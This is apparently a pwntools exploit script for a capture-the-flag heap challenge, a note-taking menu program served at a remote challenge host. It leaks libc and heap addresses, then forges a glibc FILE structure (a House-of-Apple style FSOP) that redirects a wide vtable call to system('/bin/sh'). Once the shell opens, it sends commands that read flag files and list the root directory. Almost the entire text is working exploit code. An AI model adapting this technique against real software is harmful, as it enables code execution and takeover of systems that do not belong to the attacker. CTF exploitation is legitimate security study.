import sys,os,struct,time
from pwn import *
context.arch='amd64'; context.log_level=os.environ.get('LOG','info')
WORK=os.path.dirname(os.path.abspath(__file__)); BIN=os.path.join(WORK,'chal_patched')
MODE=sys.argv[1] if len(sys.argv)>1 else 'local'
def P(v): return struct.pack('<Q',v&((1<<64)-1))

if MODE=='remote':
    r=remote('chal.secso.cc',4007)
else:
    r=process([BIN], aslr=(MODE!='local'))  # local => aslr off

def menu(c): r.recvuntil(b'>> '); r.sendline(str(c).encode())
def create(size,data):
    menu(1); r.recvuntil(b'this person?'); r.sendline(str(size).encode())
    r.recvuntil(b'hate them'); r.send(data); r.recvuntil(b'drafted with id '); return int(r.recvline().strip())
def view(idx):
    menu(4); r.recvuntil(b'view?'); r.sendline(str(idx).encode()); r.recvuntil(b'hate note: '); return r.recvuntil(b'\n',drop=True)
def delete(idx):
    menu(3); r.recvuntil(b'delete?'); r.sendline(str(idx).encode()); r.recvuntil(b'carved in history')
def vh(): menu(5)

LOCK_OFF=0x21a1d0
def leak_file(libc,target,N=8):
    FJ=libc+0x217600; b=bytearray(0x1d0)
    def put(o,v): b[o:o+8]=P(v)
    put(0x00,0x1800); put(0x10,target); put(0x20,target); put(0x28,target+N); put(0x30,target+N)
    put(0x38,target); put(0x40,target+N); put(0x70,1); put(0x88,libc+LOCK_OFF); put(0xd8,FJ)
    b[0x08]=0x0a   # plant: first newline harmless (read_ptr byte, unused)
    return bytes(b)

def house_file(fp, libc):
    WFILE=libc+0x2170c0; system=libc+0x50d70
    W=fp+0x18; V=fp+0x100
    b=bytearray(0x1d0)
    def put(o,v): b[o:o+8]=P(v)
    b[0:10]=b"  /bin/sh\x00"
    put(0xa0,W)          # _wide_data
    put(0x30,0)          # W->_IO_write_base (W+0x18)
    put(0x48,0)          # W->_IO_buf_base   (W+0x30)
    put(0xf8,V)          # W->_wide_vtable   (W+0xe0)
    put(0x168,system)    # V->__doallocate   (V+0x68)
    put(0xd8,WFILE)      # vtable
    put(0x88,fp+0x188)   # _lock -> in-chunk zero (offset 0x188)
    put(0xc0,0)          # _mode
    b[0x10]=0x0a   # plant: first newline harmless (read_end byte, unused)
    return bytes(b)

# stage1: libc leak
vh(); n0=create(0x1d0,b'B'*0x1d0)
d=view(n0); libc=u64(d[0x1d0:0x1d8].ljust(8,b'\0'))-0x2170c0
log.info('libc_base = %#x', libc); assert libc&0xfff==0,'bad libc'

# stage2: heap leak + place House FILE
delete(n0)
lf=leak_file(libc, libc+0x21ac80+0x60, 8)
n1=create(0x1d0, lf)
menu(2); r.recvuntil(b'edit?'); r.recvuntil(b'>> '); r.sendline(str(n1).encode())
raw=r.recv(8)                       # first 8 bytes = main_arena.top
top=u64(raw[:8]); fp=top-0x1d0
log.info('leaked top=%#x  fp=%#x', top, fp)
# edit now waits at read(0, A, 0x1d0) after "Aaaanddd..." prompt
r.recvuntil(b'>> ')                 # consume 'Aaaanddd please enter your changes\n>> '
hf=house_file(fp, libc)
assert len(hf)==0x1d0
r.send(hf)                          # place House FILE into A via edit's read
r.recvuntil(b'more now')            # "Hope you love your hate note more now."

# stage3: trigger -> edit again -> fwrite on House FILE -> system("  /bin/sh")
menu(2); r.recvuntil(b'edit?'); r.recvuntil(b'>> '); r.sendline(str(n1).encode())
time.sleep(0.4)
r.sendline(b'echo POPPED_$(id -u 2>/dev/null); cat /flag /app/flag flag 2>/dev/null; ls -la / 2>/dev/null | head')
time.sleep(0.6)
out=r.recv(timeout=3)
print("=== SHELL OUTPUT ===")
print(out.decode(errors='replace'))
if MODE=='remote':
    try: r.interactive(prompt='')
    except Exception as e: print('interactive end',e)
else:
    r.close()
